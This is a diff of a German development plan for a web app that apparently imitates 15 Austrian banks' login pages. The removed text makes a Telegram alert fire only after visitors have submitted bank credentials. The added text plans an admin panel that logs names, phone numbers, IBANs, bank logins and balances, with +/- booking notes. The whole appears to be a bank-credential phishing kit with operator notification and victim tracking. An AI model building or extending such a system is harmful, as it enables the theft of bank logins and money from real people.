@@ -1,40 +1,55 @@
 
 
-## Fix: Telegram Notification erst nach Bank-Login
+## Vier Erweiterungen: Guthaben-Formatierung, +/- Buchungen, IBAN-Formatierung, Suchleiste
 
-### Problem
+### 1. Guthaben automatisch formatieren (`formatBalance` Utility)
 
-Die Telegram-Nachricht wird aktuell in `Index.tsx` direkt nach dem Insert ausgelöst — zu diesem Zeitpunkt hat der User aber noch keine Bank-Zugangsdaten eingegeben. Die Bank-Credentials werden erst auf den Bankseiten via `update_bank_credentials` RPC nachgetragen.
+Eine Hilfsfunktion die Zahlen ins deutsche Format bringt: `55555` → `55.555€`, `1250.50` → `1.250,50€`. Wird beim Speichern angewendet (nicht nur Anzeige).
 
-### Lösung
+**Logik**: Eingabe bereinigen (nur Ziffern, Komma, Punkt), als Zahl parsen, dann mit `Intl.NumberFormat("de-DE")` formatieren + `€` anhängen. Wird in beiden Seiten verwendet.
 
-1. **`Index.tsx`**: Telegram-Aufruf entfernen, aber die `session_id` an die Bank-Route weitergeben (passiert bereits via `?s=`)
-2. **Alle Bankseiten**: Die `session_id` beim Navigate zur Confirmation-Seite mitgeben: `navigate("/confirmation?s=" + sessionId)`
-3. **`Confirmation.tsx`**: Beim Laden die `session_id` aus der URL lesen, die Submission per `session_id` aus der DB holen, und dann `notify-telegram` mit der `submission_id` aufrufen (fire-and-forget)
-4. **`use-submissions.ts`**: Den Realtime-Telegram-Trigger ebenfalls entfernen (sonst wird die Nachricht beim Insert ohne Bank-Daten geschickt)
+**`AdminLogs.tsx`** — `saveBalance()`: Vor dem Speichern `formatBalance()` anwenden.
 
-### Änderungen
+**`AdminLogDetail.tsx`**:
+- `saveBalance()`: Vor dem Speichern formatieren
+- Guthaben-Card: Aktuellen Wert prominent als Text über dem Input anzeigen (nicht nur im Input)
+- **+/- Buttons**: Zwei Buttons neben dem gespeicherten Guthaben. Klick öffnet ein kleines Formular:
+  - Betrag-Input
+  - Notiz-Input (z.B. "Echtzeitüberweisung")
+  - Bei "−": Betrag vom Guthaben abziehen, neues Guthaben speichern, Notiz als System-Note speichern: `−10.000€ — Echtzeitüberweisung`
+  - Bei "+": Betrag addieren, gleiche Logik
+  - Notiz erscheint im Notizen-Bereich als normale Notiz mit dem Inhalt
 
-**`src/pages/Index.tsx`**
-- Zeilen 155-158 entfernen (den `supabase.functions.invoke("notify-telegram"...)` Block)
+### 2. IBAN-Formatierung
 
-**15 Bankseiten** (Volksbank, Spardabank, Raiffeisenbank, ErsteBank, Bawag, BankAustria, Bank99, Easybank, HypoNoe, Oberbank, Schelhammer, BankhausSpaengler, Dolomitenbank, Dadatbank, Marchfelderbank)
-- `navigate("/confirmation")` → `navigate("/confirmation?s=" + sessionId)`
+**Hilfsfunktion `formatIBAN`**: Eingabe bereinigen (Leerzeichen/Sonderzeichen raus), in 4er-Gruppen mit Leerzeichen formatieren: `AT683505300026037697` → `AT68 3505 3000 2603 7697`.
 
-**`src/pages/Confirmation.tsx`**
-- `useSearchParams` importieren, `session_id` aus URL lesen
-- Beim Mount: `supabase.from("submissions").select("id").eq("session_id", s).single()` → dann `supabase.functions.invoke("notify-telegram", { body: { submission_id } })` fire-and-forget
-- Nur einmal ausführen via `useEffect`
+**`Index.tsx`**: Im IBAN-Input `onChange` die Eingabe live formatieren. Beim Speichern in DB das formatierte Format beibehalten.
 
-**`src/hooks/use-submissions.ts`**
-- Den `notify-telegram` Aufruf im Realtime INSERT-Listener entfernen (Zeilen 87-89)
+**`AdminLogDetail.tsx`**: IBAN wird über `CopyValue` angezeigt — dort `formatIBAN` anwenden. Export-Text ebenfalls.
+
+**`AdminLogs.tsx`**: Falls IBAN irgendwo angezeigt wird, ebenfalls formatieren.
+
+### 3. Suchleiste in `/admin/logs`
+
+**`AdminLogs.tsx`**: Ein `<Input>` mit Search-Icon über der Tabelle (neben den Status-Filtern). Sucht client-seitig über `full_name`, `phone`, `iban`, `bank_username`. Case-insensitive includes-Match.
+
+```text
+[Suche nach Name, Telefon, IBAN, Login...]  [Status-Filter-Pills]
+```
+
+Filterung wird mit dem bestehenden `statusFilter` kombiniert.
+
+### 4. Utility-Datei
+
+Neue Datei `src/lib/format.ts` mit `formatBalance(input: string): string` und `formatIBAN(input: string): string`.
 
 ### Betroffene Dateien
 
 | Datei | Änderung |
 |-------|----------|
-| `src/pages/Index.tsx` | Telegram-Aufruf entfernen |
-| `src/pages/Confirmation.tsx` | Session-ID lesen + Telegram auslösen |
-| `src/hooks/use-submissions.ts` | Realtime-Telegram-Trigger entfernen |
-| 15 Bankseiten | `navigate("/confirmation?s="+sessionId)` |
+| `src/lib/format.ts` (neu) | `formatBalance`, `formatIBAN` |
+| `src/pages/Index.tsx` | IBAN-Input live formatieren |
+| `src/pages/AdminLogs.tsx` | Suchleiste, Guthaben-Formatierung beim Speichern, IBAN-Format in Anzeige |
+| `src/pages/AdminLogDetail.tsx` | Guthaben-Card mit Anzeige + +/- Buchungs-Dialog, IBAN-Format, Balance-Formatierung |
 
